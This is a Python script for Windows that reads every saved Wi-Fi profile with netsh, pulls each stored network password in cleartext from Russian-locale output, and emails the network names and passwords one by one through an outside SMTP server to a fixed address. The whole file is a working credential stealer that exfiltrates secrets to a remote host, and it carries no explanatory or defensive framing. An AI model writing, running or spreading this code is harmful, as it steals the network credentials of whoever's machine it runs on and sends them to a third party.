import smtplib
import subprocess
import time

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
allWiFi = [line.split(':')[1][1:-1] for line in data if "Все профили пользователя" in line]

for wifi in allWiFi:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode(
        'cp866').split(
        '\n')

    results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]

    try:
        email = 'no-reply@mail.com'
        password = '*****'
        dest_email = 'admin@mail.com'
        subject = 'Wi-Fi'
        email_text = (f'Name: {wifi}, Password: {results[0]}')
        message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)
        server = smtplib.SMTP_SSL('mail.hosting.tools')
        server.set_debuglevel(1)
        server.ehlo(email)
        server.login(email, password)
        server.auth_plain()
        server.sendmail(email, dest_email, message)
        server.quit()
        # print(f'Имя сети: {wifi}, Пароль: {results[0]}')
    except IndexError:
        email = 'no-reply@mail.com'
        password = '*****'
        dest_email = 'admin@mail.com'
        subject = 'Wi-Fi'
        email_text = (f'Name: {wifi}, Password not found')
        message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)
        server = smtplib.SMTP_SSL('mail.hosting.tools')
        server.set_debuglevel(1)
        server.ehlo(email)
        server.login(email, password)
        server.auth_plain()
        server.sendmail(email, dest_email, message)
        server.quit()
        # print(f'Имя сети: {wifi}, Пароль не найден')
